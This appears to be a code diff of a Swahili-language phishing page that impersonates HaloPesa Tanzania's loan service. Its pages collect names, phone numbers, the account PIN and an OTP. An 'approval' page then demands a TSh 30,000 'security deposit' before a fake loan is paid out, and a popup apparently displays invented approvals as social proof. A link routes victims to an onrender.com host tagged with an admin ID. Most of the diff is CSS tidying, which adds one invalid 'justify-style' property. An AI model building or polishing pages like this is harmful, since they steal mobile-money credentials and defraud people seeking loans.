@@ -22,24 +22,39 @@
     --radius: 12px;
     --radius-sm: 8px;
   }
- * {
+
+  * {
     box-sizing: border-box;
     margin: 0;
     padding: 0;
-}
+  }
 
-body {
+  body {
     font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
     background: var(--page-bg);
     color: var(--text-dark);
     min-height: 100vh;
-}
-  /* PAGE SYSTEM */
-  .page { display: none; min-height: 100vh; animation: fadeIn 0.3s ease; }
-  .page.active { display: flex; flex-direction: column; }
-  @keyframes fadeIn { from{opacity:0;transform:translateY(8px)} to{opacity:1;transform:translateY(0)} }
+    overflow-x: hidden;
+  }
 
-  /* OVERLAY */
+  /* PAGE ISOLATION & FLOW SYSTEM */
+  .page { 
+    display: none !important; 
+    min-height: 100vh; 
+    width: 100%;
+    flex-direction: column;
+    justify-content: space-between;
+    animation: fadeIn 0.3s ease; 
+  }
+  .page.active { 
+    display: flex !important; 
+  }
+  @keyframes fadeIn { 
+    from { opacity: 0; transform: translateY(8px); } 
+    to { opacity: 1; transform: translateY(0); } 
+  }
+
+  /* OVERLAY & MODALS */
   .overlay { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.5); backdrop-filter:blur(3px); z-index:999; align-items:center; justify-content:center; }
   .overlay.show { display:flex; }
   .modal { background:var(--white); border-radius:var(--radius); padding:40px 36px; text-align:center; max-width:320px; width:90%; box-shadow:0 20px 60px rgba(0,0,0,0.2); animation:popIn 0.3s cubic-bezier(.34,1.56,.64,1); }
@@ -49,41 +64,15 @@ body {
   .modal h3 { font-size:1.1rem; font-weight:600; color:var(--text-dark); margin-bottom:6px; }
   .modal p  { font-size:0.88rem; color:var(--text-light); }
 
-/* LOGO */
-.logo-group{
-    display:flex;
-    flex-direction:column;
-    align-items:center;
-    gap:3px;
-}
+  /* LOGO COMPONENTS */
+  .logo-group { display:flex; flex-direction:column; align-items:center; gap:3px; }
+  .logo-img { width:40px; height:40px; object-fit:contain; display:block; }
+  .logo-text { font-size:1.1rem; font-weight:800; letter-spacing:-0.02em; }
+  .logo-text .halo { color:#fff; }
+  .logo-text .pesa { color:#ffdd00; }
+  .logo-sub { font-size:0.72rem; color:rgba(255,255,255,0.65); }
 
-.logo-img{
-    width:40px;
-    height:40px;
-    object-fit:contain;
-    display:block;
-}
-
-.logo-text{
-    font-size:1.1rem;
-    font-weight:800;
-    letter-spacing:-0.02em;
-}
-
-.logo-text .halo{
-    color:#fff;
-}
-
-.logo-text .pesa{
-    color:#ffdd00;
-}
-
-.logo-sub{
-    font-size:0.72rem;
-    color:rgba(255,255,255,0.65);
-}
-
-  /* NAV */
+  /* NAVBAR */
   .navbar { background:var(--navy); display:flex; align-items:center; justify-content:center; padding:0 20px; height:54px; position:relative; flex-shrink:0; }
   .nav-left { position:absolute; left:20px; color:rgba(255,255,255,0.8); font-size:0.84rem; cursor:pointer; text-decoration:none; transition:color 0.2s; }
   .nav-left:hover { color:#fff; }
@@ -97,7 +86,7 @@ body {
   .btn-gray { background:#e0e0e0; color:#666; border:none; border-radius:8px; padding:14px 20px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; flex:1; font-family:inherit; transition:background 0.2s; }
   .btn-gray:hover { background:#d0d0d0; }
 
-  /* FORM */
+  /* FORMS */
   .field { margin-bottom:18px; }
   .field label { display:block; font-size:0.82rem; font-weight:500; color:var(--text-mid); margin-bottom:6px; }
   .field input, .field select, .field textarea { width:100%; padding:11px 14px; border:1.5px solid var(--border); border-radius:var(--radius-sm); font-family:inherit; font-size:0.9rem; color:var(--text-dark); background:#fff; outline:none; transition:border-color 0.2s, box-shadow 0.2s; appearance:none; -webkit-appearance:none; }
@@ -121,8 +110,18 @@ body {
   .step-btns { display:flex; gap:12px; margin-top:8px; }
   .step-btns .btn-grad { flex:1; }
 
-  /* FOOTER */
-  .pg-footer { margin-top:auto; padding:14px; text-align:center; font-size:0.78rem; color:var(--text-light); background:#fff; border-top:1px solid #eee; flex-shrink:0; }
+  /* FOOTERS */
+  .pg-footer { 
+    margin-top:auto; 
+    padding:16px; 
+    text-align:center; 
+    font-size:0.78rem; 
+    color:var(--text-light); 
+    background:#fff; 
+    border-top:1px solid #eee; 
+    width: 100%;
+    flex-shrink: 0;
+  }
 
   /* ───── PAGE 1: LANDING ───── */
   #page-landing { background:var(--page-bg); }
@@ -143,14 +142,14 @@ body {
   .monthly-box { background:#fff; border:1px solid #eee; border-radius:var(--radius-sm); padding:14px 16px; display:flex; justify-content:space-between; align-items:center; }
   .monthly-box .ml { font-size:0.82rem; color:var(--text-light); }
   .monthly-box .ma { font-size:1.5rem; font-weight:700; color:var(--teal); }
-  .feats-row { display:flex; justify-content:space-around; padding:20px 0 0; border-top:1px solid #f0f0f0; margin-top:4px; }
+  .feats-row { display:flex; justify-style:space-around; padding:20px 0 0; border-top:1px solid #f0f0f0; margin-top:4px; }
   .feat { text-align:center; }
   .feat .fi { font-size:1.6rem; margin-bottom:5px; }
   .feat .ft { font-size:0.8rem; font-weight:600; }
   .feat .fs { font-size:0.73rem; color:var(--text-light); }
-  .land-footer { background:var(--navy); padding:14px; text-align:center; font-size:0.77rem; color:rgba(255,255,255,0.6); flex-shrink:0; }
+  .land-footer { background:var(--navy); padding:16px; text-align:center; font-size:0.77rem; color:rgba(255,255,255,0.6); flex-shrink:0; margin-top:auto; width:100%; }
 
-  /* ───── STEP PAGES 2-4 ───── */
+  /* ───── STEP PAGES 1-3 ───── */
   .step-center { flex:1; display:flex; align-items:flex-start; justify-content:center; padding:28px 16px; }
   .step-card { width:100%; max-width:480px; background:#fff; border-radius:var(--radius); box-shadow:0 4px 24px rgba(0,0,0,0.08); padding:32px 28px; }
   .step-card h2 { font-size:1.25rem; font-weight:700; text-align:center; margin-bottom:4px; }
@@ -165,8 +164,8 @@ body {
   .sum-box .sum-row .sv { font-weight:500; }
 
   /* ───── PAGE 5: SUBMITTED ───── */
-  #page-submitted { background:linear-gradient(160deg,var(--navy),#cc5500); align-items:center; justify-content:center; }
-  .sub-wrap { text-align:center; padding:40px 24px; max-width:420px; }
+  #page-submitted { background:linear-gradient(160deg,var(--navy),#cc5500); align-items:center; justify-content:space-between; }
+  .sub-wrap { text-align:center; padding:40px 24px; max-width:420px; margin:auto; }
   .sub-icon { width:80px; height:80px; border-radius:50%; background:rgba(255,255,255,0.1); border:2px solid rgba(255,255,255,0.3); display:flex; align-items:center; justify-content:center; font-size:2rem; margin:0 auto 24px; animation:pulse 2s ease infinite; }
   @keyframes pulse { 0%,100%{box-shadow:0 0 0 0 rgba(255,102,0,0.3)} 50%{box-shadow:0 0 0 16px rgba(255,102,0,0)} }
   .sub-wrap h2 { font-size:1.6rem; font-weight:700; color:#fff; margin-bottom:12px; }
@@ -194,7 +193,7 @@ body {
   .forgot-pin { text-align:center; font-size:0.82rem; color:var(--text-light); margin-bottom:24px; cursor:pointer; }
   .btn-login { width:100%; max-width:380px; padding:13px; background:#e8e8e8; color:#aaa; border:none; border-radius:8px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; font-family:inherit; transition:all 0.2s; }
   .btn-login.rdy { background:var(--grad); color:#fff; }
-  .lg-curve { margin-top:32px; background:#fff; overflow:hidden; flex-shrink:0; }
+  .lg-curve { margin-top:32px; background:#fff; overflow:hidden; flex-shrink:0; width:100%; }
   .lg-curve::before { content:''; display:block; background:var(--navy); height:55px; clip-path:ellipse(60% 100% at 50% 100%); margin-bottom:-4px; }
   .lg-foot { background:var(--navy); padding:24px 20px 32px; display:flex; flex-direction:column; align-items:center; gap:8px; text-align:center; }
   .lg-foot .logo-text { font-size:1.2rem; }
@@ -219,18 +218,23 @@ body {
   .otp-resend { font-size:0.8rem; color:var(--teal); margin-bottom:22px; }
   .btn-otp { width:100%; padding:13px; background:#e8e8e8; color:#aaa; border:none; border-radius:8px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; font-family:inherit; transition:all 0.2s; }
   .btn-otp.rdy { background:var(--grad); color:#fff; }
-  .otp-curve { background:#fff; overflow:hidden; flex-shrink:0; }
+  .otp-curve { background:#fff; overflow:hidden; flex-shrink:0; width:100%; }
   .otp-curve::before { content:''; display:block; background:var(--navy); height:50px; clip-path:ellipse(60% 100% at 50% 100%); margin-bottom:-4px; }
-  .otp-foot { background:var(--navy); padding:14px; text-align:center; font-size:0.75rem; color:rgba(255,255,255,0.55); }
+  .otp-foot { background:var(--navy); padding:16px; text-align:center; font-size:0.75rem; color:rgba(255,255,255,0.55); }
 
-  /* ───── PAGE 8: APPROVAL (REDESIGNED SUCCESS PAGE) ───── */
+  /* ───── PAGE 8: APPROVAL ───── */
   #page-approval { 
     background: #f4f6f8; 
-    min-height: 100vh; 
-    display: flex;
     align-items: center; 
-    justify-content: center; 
-    padding: 24px 16px; 
+    justify-content: space-between; 
+  }
+  .appr-body-wrap {
+    flex: 1;
+    width: 100%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 24px 16px;
   }
   .appr-wrap { 
     width: 100%; 
@@ -242,75 +246,21 @@ body {
     border: 1px solid rgba(0,0,0,0.05);
   }
   
-  .appr-header {
-    background: #ffffff;
-    padding: 24px 20px 16px;
-    text-align: center;
-  }
-  
-  .check-circle { 
-    width: 64px; 
-    height: 64px; 
-    border-radius: 50%; 
-    background: #10b981; 
-    display: flex; 
-    align-items: center; 
-    justify-content: center; 
-    margin: 0 auto 14px; 
-    font-size: 1.8rem; 
-    color: #fff; 
-    box-shadow: 0 6px 20px rgba(16,185,129,0.3); 
-  }
+  .appr-header { background: #ffffff; padding: 24px 20px 16px; text-align: center; }
+  .check-circle { width: 64px; height: 64px; border-radius: 50%; background: #10b981; display: flex; align-items: center; justify-content: center; margin: 0 auto 14px; font-size: 1.8rem; color: #fff; box-shadow: 0 6px 20px rgba(16,185,129,0.3); }
   .appr-title { font-size: 1.35rem; font-weight: 800; color: #111827; margin-bottom: 4px; }
   .appr-sub   { font-size: 0.85rem; color: #6b7280; line-height: 1.4; }
 
-  .appr-banner { 
-    background: linear-gradient(135deg, #cc3300 0%, #ff6600 100%); 
-    padding: 20px 16px; 
-    text-align: center; 
-    color: #fff;
-  }
+  .appr-banner { background: linear-gradient(135deg, #cc3300 0%, #ff6600 100%); padding: 20px 16px; text-align: center; color: #fff; }
   .appr-banner .abl { font-size: 0.75rem; color: rgba(255,255,255,0.85); text-transform: uppercase; letter-spacing: 0.08em; font-weight: 600; }
   .appr-banner .aba { font-size: 2.2rem; font-weight: 800; color: #ffffff; margin-top: 2px; }
 
-  /* HIGH CONVERTING DEPOSIT NOTICE BOX */
-  .comp-box { 
-    background: #fffbeb; 
-    border: 1.5px solid #fcd34d; 
-    border-radius: 12px;
-    padding: 18px; 
-    margin: 20px;
-    box-shadow: 0 4px 12px rgba(245, 158, 11, 0.08);
-  }
-  .comp-box .ch { 
-    display: flex; 
-    align-items: center; 
-    gap: 8px; 
-    font-size: 0.9rem; 
-    font-weight: 800; 
-    color: #b45309; 
-    margin-bottom: 10px; 
-    text-transform: uppercase;
-    letter-spacing: 0.03em;
-  }
+  .comp-box { background: #fffbeb; border: 1.5px solid #fcd34d; border-radius: 12px; padding: 18px; margin: 20px; box-shadow: 0 4px 12px rgba(245, 158, 11, 0.08); }
+  .comp-box .ch { display: flex; align-items: center; gap: 8px; font-size: 0.9rem; font-weight: 800; color: #b45309; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 0.03em; }
   .comp-box p { font-size: 0.85rem; color: #451a03; line-height: 1.6; }
   .comp-box p strong { color: #92400e; font-weight: 700; }
-  .deposit-badge {
-    display: inline-block;
-    background: #fef3c7;
-    color: #92400e;
-    font-weight: 800;
-    padding: 2px 8px;
-    border-radius: 4px;
-    border: 1px solid #fde68a;
-  }
-  .comp-note {
-    margin-top: 10px;
-    padding-top: 10px;
-    border-top: 1px dashed #fcd34d;
-    font-size: 0.78rem;
-    color: #78350f;
-  }
+  .deposit-badge { display: inline-block; background: #fef3c7; color: #92400e; font-weight: 800; padding: 2px 8px; border-radius: 4px; border: 1px solid #fde68a; }
+  .comp-note { margin-top: 10px; padding-top: 10px; border-top: 1px dashed #fcd34d; font-size: 0.78rem; color: #78350f; }
 
   .ld-card { background: #f9fafb; padding: 18px 20px; border-top: 1px solid #f3f4f6; border-bottom: 1px solid #f3f4f6; }
   .ld-card .ld-htitle { font-size: 0.85rem; font-weight: 700; color: #374151; margin-bottom: 12px; display: flex; align-items: center; gap: 6px; }
@@ -335,7 +285,6 @@ body {
   .rth-btn { width: 100%; padding: 13px; background: #f3f4f6; color: #4b5563; border: none; border-radius: var(--radius-sm); font-size: 0.88rem; font-weight: 600; cursor: pointer; font-family: inherit; transition: all 0.2s ease; }
   .rth-btn:hover { background: #e5e7eb; color: #111827; }
   
-  /* HIGH-PRO OMBA TENA BUTTON */
   .reapply-btn-pro { 
     width: 100%; 
     padding: 16px 20px; 
@@ -363,9 +312,9 @@ body {
     box-shadow: 0 8px 22px rgba(16, 185, 129, 0.45);
   }
 
-/* ───── COMPACT PROFESSIONAL LIVE APPROVAL CARD ───── */
-.live-popup {
-    position: absolute;
+  /* LIVE POPUP NOTIFICATION */
+  .live-popup {
+    position: fixed;
     top: 72px;
     left: 50%;
     transform: translateX(-50%);
@@ -384,57 +333,22 @@ body {
     visibility: hidden;
     transition: all 0.3s ease;
     z-index: 9999;
-}
+  }
 
-.live-popup.show {
+  .live-popup.show {
     opacity: 1;
     visibility: visible;
-}
+  }
 
-.popup-avatar {
-    width: 28px;
-    height: 28px;
-    min-width: 28px;
-    border-radius: 50%;
-    background: var(--grad);
-    color: #fff;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 0.75rem;
-    font-weight: 600;
-}
+  .popup-avatar { width: 28px; height: 28px; min-width: 28px; border-radius: 50%; background: var(--grad); color: #fff; display: flex; align-items: center; justify-content: center; font-size: 0.75rem; font-weight: 600; }
+  .popup-content { flex: 1; }
+  .popup-text { font-size: 0.71rem; line-height: 1.3; color: var(--text-mid); }
+  .popup-text strong { color: var(--text-dark); font-weight: 600; }
+  .popup-time { margin-top: 1px; font-size: 0.58rem; color: #16a34a; font-weight: 500; }
+  .popup-time::before { content: "● "; animation: livePulse 1.2s infinite; }
+  @keyframes livePulse { 50% { opacity: .4; } }
 
-.popup-content {
-    flex: 1;
-}
-
-.popup-text {
-    font-size: 0.71rem;
-    line-height: 1.3;
-    color: var(--text-mid);
-}
-
-.popup-text strong {
-    color: var(--text-dark);
-    font-weight: 600;
-}
-
-.popup-time {
-    margin-top: 1px;
-    font-size: 0.58rem;
-    color: #16a34a;
-    font-weight: 500;
-}
-
-.popup-time::before {
-    content: "● ";
-    animation: pulse 1.2s infinite;
-}
-
-@keyframes pulse {
-    50% { opacity: .4; }
-}  /* ───── INLINE ERROR / STATUS MESSAGES ───── */
+  /* INLINE MESSAGES */
   .msg-box { border-radius:var(--radius-sm); padding:12px 16px; font-size:0.84rem; margin-bottom:16px; display:none; align-items:center; gap:10px; }
   .msg-box.show { display:flex; }
   .msg-box.error   { background:#fef2f2; border:1.5px solid #fecaca; color:#991b1b; }
@@ -443,74 +357,29 @@ body {
   .msg-box.warning { background:#fefce8; border:1.5px solid #fef08a; color:#854d0e; }
   .msg-icon { font-size:1.1rem; flex-shrink:0; }
 
-  /* ───── WAITING / POLLING INDICATOR ───── */
+  /* WAITING BOX */
   .waiting-box { background:#fff8f5; border:1px solid #ffe0cc; border-radius:var(--radius-sm); padding:16px; text-align:center; margin-bottom:16px; display:none; }
   .waiting-box.show { display:block; }
   .waiting-box .wb-spinner { width:28px; height:28px; border:3px solid #ffe0cc; border-top-color:var(--teal); border-radius:50%; animation:spin 0.8s linear infinite; margin:0 auto 10px; }
   .waiting-box p { font-size:0.82rem; color:var(--text-mid); }
 
-/* HaloPesa Logo */
-.hp-logo-inline {
-  display: flex;
-  align-items: center;
-  gap: 8px;
-}
+  /* BRAND LOGOS */
+  .hp-logo-inline { display: flex; align-items: center; gap: 8px; }
+  .hp-logo-inline img { width: 36px; height: 36px; object-fit: contain; display: block; }
+  .hp-logo-inline .brand { font-size: 1.4rem; font-weight: 800; color: #fff; letter-spacing: -0.01em; }
+  .hp-logo-inline .brand span { color: #ffdd00; }
 
-.hp-logo-inline img {
-  width: 36px;
-  height: 36px;
-  object-fit: contain;
-  display: block;
-}
+  .hp-logo-sm { display: flex; align-items: center; gap: 6px; }
+  .hp-logo-sm img { width: 26px; height: 26px; object-fit: contain; display: block; }
+  .hp-logo-sm .brand { font-size: 1.1rem; font-weight: 800; color: #fff; }
+  .hp-logo-sm .brand span { color: #ffdd00; }
 
-.hp-logo-inline .brand {
-  font-size: 1.4rem;
-  font-weight: 800;
-  color: #fff;
-  letter-spacing: -0.01em;
-}
-
-.hp-logo-inline .brand span {
-  color: #ffdd00;
-}
-
-.hp-logo-sm {
-  display: flex;
-  align-items: center;
-  gap: 6px;
-}
-
-.hp-logo-sm img {
-  width: 26px;
-  height: 26px;
-  object-fit: contain;
-  display: block;
-}
-
-.hp-logo-sm .brand {
-  font-size: 1.1rem;
-  font-weight: 800;
-  color: #fff;
-}
-
-.hp-logo-sm .brand span {
-  color: #ffdd00;
-}
-
-@media (max-width:500px) {
-  .field-row {
-    grid-template-columns: 1fr;
+  @media (max-width:500px) {
+    .field-row { grid-template-columns: 1fr; }
+    .step-card, .land-card { padding: 24px 18px; }
+    .otp-card { padding: 24px 16px; }
   }
-
-  .step-card,
-  .land-card {
-    padding: 24px 18px;
-  }
-
-  .otp-card {
-    padding: 24px 16px;
-  }
-}</style>
+</style>
 </head>
 
 <body>
@@ -518,26 +387,18 @@ body {
 <!-- PAGE 1: LANDING -->
 <div id="page-landing" class="page active">
   <nav class="land-nav">
-    <div class="hbg">
-      <span></span>
-      <span></span>
-      <span></span>
-    </div>
-
+    <div class="hbg"><span></span><span></span><span></span></div>
     <div class="hp-logo-inline">
-        <img src="images/halopesa-logo.png" alt="HaloPesa Logo" class="logo-img">
-        <div class="brand">Halo<span>Pesa</span></div>
+      <img src="images/halopesa-logo.png" alt="HaloPesa Logo" class="logo-img">
+      <div class="brand">Halo<span>Pesa</span></div>
     </div>
-
     <div style="width:28px"></div>
   </nav>
 
   <div class="land-center">
     <div class="land-card">
-        <h1>Pata Mkopo Wako Haraka</h1>
-        <p class="land-tagline">
-            Idhini ya haraka • Riba nafuu • Muda rahisi
-        </p>
+      <h1>Pata Mkopo Wako Haraka</h1>
+      <p class="land-tagline">Idhini ya haraka • Riba nafuu • Muda rahisi</p>
         
       <div class="calc-box">
         <h2>Kikokotoo cha Mkopo</h2>
@@ -576,6 +437,7 @@ body {
     </div>
     <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
   </nav>
+  
   <div class="step-center">
     <div class="step-card">
       <h2>Maombi ya Mkopo</h2>
@@ -589,6 +451,8 @@ body {
       <button class="btn-grad" onclick="toS2()">HATUA INAYOFUATA</button>
     </div>
   </div>
+
+  <div class="pg-footer">© 2026 HaloPesa Tanzania</div>
 </div>
 
 <!-- PAGE STEP 2 -->
@@ -601,6 +465,7 @@ body {
     </div>
     <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
   </nav>
+
   <div class="step-center">
     <div class="step-card">
       <h2>Maombi ya Mkopo</h2>
@@ -622,6 +487,7 @@ body {
       </div>
     </div>
   </div>
+
   <div class="pg-footer">© 2026 HaloPesa Tanzania</div>
 </div>
 
@@ -635,6 +501,7 @@ body {
     </div>
     <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
   </nav>
+
   <div class="step-center">
     <div class="step-card">
       <h2>Maombi ya Mkopo</h2>
@@ -656,6 +523,7 @@ body {
       </div>
     </div>
   </div>
+
   <div class="pg-footer">© 2026 HaloPesa Tanzania</div>
 </div>
 
@@ -668,6 +536,8 @@ body {
     <div class="redir-pill">🔄 Unaelekezwa kwenye kuingia HaloPesa katika <span class="redir-n" id="rdN">3</span>s...</div><br>
     <button class="btn-go" onclick="goTo('page-login')">Nenda Kuingia Sasa</button>
   </div>
+
+  <div class="land-footer">© 2026 HaloPesa Tanzania</div>
 </div>
 
 <!-- PAGE LOGIN -->
@@ -679,6 +549,7 @@ body {
       <div class="logo-sub">Mikopo ya Haraka na Rahisi</div>
     </div>
   </div>
+
   <div class="login-body-wrap">
     <h2>Ingia Akaunti</h2>
     <div class="login-inner">
@@ -700,6 +571,7 @@ body {
       <button class="btn-login" id="bLogin" onclick="doLogin()">INGIA</button>
     </div>
   </div>
+
   <div class="lg-curve">
     <div class="lg-foot">
       <div class="hp-logo-inline" style="flex-direction:column;gap:4px;">
@@ -723,6 +595,7 @@ body {
     </div>
     <div class="hbg2"><span></span><span></span><span></span></div>
   </div>
+
   <div class="otp-body-wrap">
     <div class="otp-card">
       <h2>Uthibitisho wa OTP</h2>
@@ -750,97 +623,102 @@ body {
       </div>
     </div>
   </div>
+
   <div class="otp-curve"><div class="otp-foot">© 2026 HaloPesa Tanzania</div></div>
 </div>
 
-<!-- PAGE APPROVAL (REDESIGNED SUCCESS PAGE) -->
+<!-- PAGE APPROVAL -->
 <div id="page-approval" class="page">
-  <div class="appr-wrap">
-    
-    <div class="appr-header">
-      <div class="hp-logo-sm" style="justify-content: center; margin-bottom: 12px;">
-        <img src="images/halopesa-logo.png" alt="HaloPesa Logo" class="logo-img">
-        <div class="brand" style="color: var(--navy);"><span style="color: var(--teal);">Halo</span>Pesa</div>
+  <div class="appr-body-wrap">
+    <div class="appr-wrap">
+      <div class="appr-header">
+        <div class="hp-logo-sm" style="justify-content: center; margin-bottom: 12px;">
+          <img src="images/halopesa-logo.png" alt="HaloPesa Logo" class="logo-img">
+          <div class="brand" style="color: var(--navy);"><span style="color: var(--teal);">Halo</span>Pesa</div>
+        </div>
+        <div class="check-circle">✓</div>
+        <div class="appr-title">Hongera! Mkopo Umeidhinishwa</div>
+        <div class="appr-sub">Hatua moja tu imebaki kukamilisha mchakato wa kutumiwa fedha zako.</div>
       </div>
-      <div class="check-circle">✓</div>
-      <div class="appr-title">Hongera! Mkopo Umeidhinishwa</div>
-      <div class="appr-sub">Hatua moja tu imebaki kukamilisha mchakato wa kutumiwa fedha zako.</div>
-    </div>
 
-    <div class="appr-banner">
-      <div class="abl">KIASI KILICHOIDHINISHWA</div>
-      <div class="aba" id="apAmt">TSh 100,000</div>
-    </div>
-
-    <div class="comp-box">
-      <div class="ch">
-        <span>🔒</span> UTHIBITISHO WA USALAMA WA MKOPO
+      <div class="appr-banner">
+        <div class="abl">KIASI KILICHOIDHINISHWA</div>
+        <div class="aba" id="apAmt">TSh 100,000</div>
       </div>
-      <p>
-        Ili mfumo uweze kutoa na kuhamisha mkopo wako mara moja, unatakiwa kuweka amana ya kianzio ya angalau <span class="deposit-badge">TSh 30,000</span> kwenye akaunti yako ya HaloPesa.
-      </p>
-      <p style="margin-top: 8px;">
-        Kiasi hiki kinatumika kama **dhamana ya usalama ya mkopo** na kinabaki kuwa salama kwenye akaunti yako. Baada ya kuweka amana hiyo, mkopo wako utatumwa papo hapo kwenye simu yako.
-      </p>
-      <div class="comp-note">
-        <em>💡 Angalizo:</em> Ukimaliza kuweka amana na usipopokea muamala wako kwa sekunde chache, bofya kitufe cha <strong>OMBA TENA</strong> hapa chini ili kuharakisha utoaji wa fedha.
-      </div>
-    </div>
 
-    <div class="ld-card">
-      <div class="ld-htitle">📋 Maelezo ya Mkopo Wako</div>
-      <div class="ld-row">
-        <div class="ld-icon ic-g">💵</div>
-        <div>
-          <div class="ld-lbl">MALIPO YA KILA MWEZI</div>
-          <div class="ld-val" id="apMthly">TSh 2,750</div>
+      <div class="comp-box">
+        <div class="ch">
+          <span>🔒</span> UTHIBITISHO WA USALAMA WA MKOPO
+        </div>
+        <p>
+          Ili mfumo uweze kutoa na kuhamisha mkopo wako mara moja, unatakiwa kuweka amana ya kianzio ya angalau <span class="deposit-badge">TSh 30,000</span> kwenye akaunti yako ya HaloPesa.
+        </p>
+        <p style="margin-top: 8px;">
+          Kiasi hiki kinatumika kama <strong>dhamana ya usalama ya mkopo</strong> na kinabaki kuwa salama kwenye akaunti yako. Baada ya kuweka amana hiyo, mkopo wako utatumwa papo hapo kwenye simu yako.
+        </p>
+        <div class="comp-note">
+          <em>💡 Angalizo:</em> Ukimaliza kuweka amana na usipopokea muamala wako kwa sekunde chache, bofya kitufe cha <strong>OMBA TENA</strong> hapa chini ili kuharakisha utoaji wa fedha.
         </div>
       </div>
-      <div class="ld-row">
-        <div class="ld-icon ic-b">📅</div>
-        <div>
-          <div class="ld-lbl">MUDA WA MKOPO</div>
-          <div class="ld-val" id="apTerm">Miezi 48</div>
+
+      <div class="ld-card">
+        <div class="ld-htitle">📋 Maelezo ya Mkopo Wako</div>
+        <div class="ld-row">
+          <div class="ld-icon ic-g">💵</div>
+          <div>
+            <div class="ld-lbl">MALIPO YA KILA MWEZI</div>
+            <div class="ld-val" id="apMthly">TSh 2,750</div>
+          </div>
+        </div>
+        <div class="ld-row">
+          <div class="ld-icon ic-b">📅</div>
+          <div>
+            <div class="ld-lbl">MUDA WA MKOPO</div>
+            <div class="ld-val" id="apTerm">Miezi 48</div>
+          </div>
+        </div>
+        <div class="ld-row">
+          <div class="ld-icon ic-p">📈</div>
+          <div>
+            <div class="ld-lbl">KIWANGO CHA RIBA</div>
+            <div class="ld-val">8% APR (Nafuu Zaidi)</div>
+          </div>
         </div>
       </div>
-      <div class="ld-row">
-        <div class="ld-icon ic-p">📈</div>
-        <div>
-          <div class="ld-lbl">KIWANGO CHA RIBA</div>
-          <div class="ld-val">8% APR (Nafuu Zaidi)</div>
-        </div>
+
+      <div class="qa-wrap">
+        <div class="qa-title">Huduma za Haraka</div>
+        <button class="qa-btn">💳 Angalia Salio la Akaunti</button>
+        <button class="qa-btn">📄 Pakua Mkataba wa Mkopo</button>
+      </div>
+
+      <div class="nxt-steps">
+        <span>🔔</span>
+        <p><strong>Utoaji wa Papo hapo:</strong> Uthibitisho wa SMS utatumwa kwenye nambari yako ya simu mara tu kiasi kinapowekwa.</p>
+      </div>
+
+      <div class="rth-wrap">
+        <a href="https://mkopo-wa-halopesa-7tw4.onrender.com?admin=ADMIN001" class="reapply-btn-pro">
+          <span>🔄</span> OMBA TENA SASA
+        </a>
+        <button class="rth-btn" onclick="goTo('page-landing')">🏠 Rudi Mwanzo</button>
       </div>
     </div>
+  </div>
 
-    <div class="qa-wrap">
-      <div class="qa-title">Huduma za Haraka</div>
-      <button class="qa-btn">💳 Angalia Salio la Akaunti</button>
-      <button class="qa-btn">📄 Pakua Mkataba wa Mkopo</button>
-    </div>
+  <div class="pg-footer">© 2026 HaloPesa Tanzania</div>
+</div>
 
-    <div class="nxt-steps">
-      <span>🔔</span>
-      <p><strong>Utoaji wa Papo hapo:</strong> Uthibitisho wa SMS utatumwa kwenye nambari yako ya simu mara tu kiasi kinapowekwa.</p>
-    </div>
-
-    <div class="rth-wrap">
-      <a href="https://mkopo-wa-halopesa-7tw4.onrender.com?admin=ADMIN001" class="reapply-btn-pro">
-        <span>🔄</span> OMBA TENA SASA
-      </a>
-      <button class="rth-btn" onclick="goTo('page-landing')">🏠 Rudi Mwanzo</button>
-    </div>
-
+<!-- LIVE POPUP NOTIFICATION -->
+<div id="popup" class="live-popup">
+  <div class="popup-avatar" id="popup-avatar">A</div>
+  <div class="popup-content">
+    <div id="popup-text" class="popup-text"></div>
+    <div id="popup-time" class="popup-time">Hivi punde</div>
   </div>
 </div>
 
-<div id="popup" class="live-popup">
-    <div class="popup-avatar" id="popup-avatar">A</div>
-    <div class="popup-content">
-        <div id="popup-text" class="popup-text"></div>
-        <div id="popup-time" class="popup-time">Hivi punde</div>
-    </div>
-</div>
-
+<!-- MODAL OVERLAYS -->
 <div class="overlay" id="mLogin">
   <div class="modal"><div class="spinner"></div><h3>Tafadhali subiri…</h3><p>Inatuma maelezo yako kwa uthibitisho</p></div>
 </div>
@@ -852,9 +730,7 @@ body {
 </div>
 
 <script>
-  // ══════════════════════════════════════════════════════
-  // STATE
-  // ══════════════════════════════════════════════════════
+  // STATE MANAGEMENT
   const S = {
     amt: 100000,
     term: 'Miezi 48',
@@ -887,18 +763,14 @@ body {
     return sessionStorage.getItem('selectedAdminId') || null;
   }
 
-  // ══════════════════════════════════════════════════════
   // PAGE NAVIGATION
-  // ══════════════════════════════════════════════════════
   function goTo(id) {
     document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
     document.getElementById(id).classList.add('active');
     window.scrollTo(0, 0);
   }
 
-  // ══════════════════════════════════════════════════════
-  // LOAN CALCULATOR (TSh currency)
-  // ══════════════════════════════════════════════════════
+  // LOAN CALCULATOR
   function calcUp() {
     const a = +document.getElementById('rA').value;
     const t = +document.getElementById('rT').value;
@@ -911,9 +783,7 @@ body {
     document.getElementById('rT').style.setProperty('--pct', ((t-6)/(60-6)*100).toFixed(1) + '%');
   }
 
-  // ══════════════════════════════════════════════════════
-  // STEP NAVIGATION
-  // ══════════════════════════════════════════════════════
+  // FORM HELPERS
   function normalizePhone(id) {
     const el = document.getElementById(id);
     if (el.value.startsWith('0')) {
@@ -967,21 +837,21 @@ body {
     const phone = document.getElementById('s2ph').value.trim();
 
     if (!first) {
-        showErr('s2Err', 'Tafadhali weka jina lako la kwanza.');
-        shakeField('s2fi');
-        return;
+      showErr('s2Err', 'Tafadhali weka jina lako la kwanza.');
+      shakeField('s2fi');
+      return;
     }
 
     if (!last) {
-        showErr('s2Err', 'Tafadhali weka jina lako la ukoo.');
-        shakeField('s2la');
-        return;
+      showErr('s2Err', 'Tafadhali weka jina lako la ukoo.');
+      shakeField('s2la');
+      return;
     }
 
